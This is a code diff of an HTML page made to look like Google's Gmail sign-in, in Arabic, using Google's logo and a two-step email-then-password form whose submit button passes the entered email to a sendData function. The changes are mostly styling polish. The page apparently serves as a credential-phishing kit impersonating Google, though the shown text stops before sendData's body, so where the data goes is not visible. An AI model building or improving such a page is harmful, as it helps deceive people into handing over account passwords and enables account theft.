@@ -16,37 +16,42 @@
       height: 100vh;
     }
 
-    .form-container {
-      background: #fff;
-      width: 360px;
-      padding: 40px 30px;
-      border-radius: 8px;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.2);
-      text-align: right;
+    .form-wrapper {
+      width: 100%;
+      max-width: 400px;
       animation: fadeIn 0.5s ease-in-out;
     }
 
+    .form-container {
+      background: #fff;
+      width: 100%;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+      text-align: right;
+    }
+
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
+      from { opacity: 0; transform: translateY(30px); }
       to { opacity: 1; transform: translateY(0); }
     }
 
     .form-container img {
       display: block;
-      margin: 0 auto 20px;
-      height: 40px;
+      margin: 0 auto 25px;
+      height: 45px;
     }
 
     h2 {
       font-size: 24px;
-      margin: 0 0 10px;
+      margin: 0 0 12px;
       color: #202124;
     }
 
     p {
       font-size: 14px;
       color: #5f6368;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
     }
 
     .input-group {
@@ -58,8 +63,9 @@
       padding: 12px 10px;
       font-size: 16px;
       border: 1px solid #dadce0;
-      border-radius: 4px;
+      border-radius: 6px;
       outline: none;
+      transition: border 0.2s;
     }
 
     input:focus {
@@ -72,7 +78,7 @@
       border: none;
       padding: 10px;
       font-size: 15px;
-      border-radius: 4px;
+      border-radius: 6px;
       width: 100%;
       cursor: pointer;
       margin-top: 10px;
@@ -84,6 +90,7 @@
       font-size: 13px;
       display: block;
       margin-top: 12px;
+      text-align: right;
     }
 
     .status {
@@ -95,17 +102,19 @@
   </style>
 </head>
 <body>
-  <div class="form-container" id="formBox">
-    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
-    <h2>تسجيل الدخول</h2>
-    <p>انتقل إلى Gmail</p>
-    <div class="input-group">
-      <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+  <div class="form-wrapper">
+    <div class="form-container" id="formBox">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
+      <h2>تسجيل الدخول</h2>
+      <p>انتقل إلى Gmail</p>
+      <div class="input-group">
+        <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+      </div>
+      <a class="link" href="#">هل نسيت البريد الإلكتروني؟</a>
+      <button onclick="goToPassword()">التالي</button>
+      <a class="link" href="#">استخدام حساب آخر</a>
+      <div class="status" id="status"></div>
     </div>
-    <a class="link" href="#">هل نسيت البريد الإلكتروني؟</a>
-    <button onclick="goToPassword()">التالي</button>
-    <a class="link" href="#">استخدام حساب آخر</a>
-    <div class="status" id="status"></div>
   </div>
 
   <script>
@@ -121,23 +130,21 @@
 
       const formBox = document.getElementById("formBox");
       formBox.innerHTML = `
-        <div class="form-container">
-          <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
-          <h2>مرحبًا ${email}</h2>
-          <p>أدخل كلمة المرور لحسابك</p>
-          <div class="input-group">
-            <input type="password" id="password" placeholder="كلمة المرور">
-          </div>
-          <a class="link" href="#">هل نسيت كلمة المرور؟</a>
-          <button onclick="sendData('${email}')">تسجيل الدخول</button>
-          <button onclick="goBack()">رجوع</button>
-          <div class="status" id="status"></div>
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
+        <h2>مرحبًا ${email}</h2>
+        <p>أدخل كلمة المرور لحسابك</p>
+        <div class="input-group">
+          <input type="password" id="password" placeholder="كلمة المرور">
         </div>
+        <a class="link" href="#">هل نسيت كلمة المرور؟</a>
+        <button onclick="sendData('${email}')">تسجيل الدخول</button>
+        <button onclick="goBack()">رجوع</button>
+        <div class="status" id="status"></div>
       `;
     }
 
     function goBack() {
-      location.reload(); // يرجع النموذج الأصلي بإعادة تحميل الصفحة
+      location.reload(); // يرجع لنموذج البريد
     }
 
     function sendData(email) {
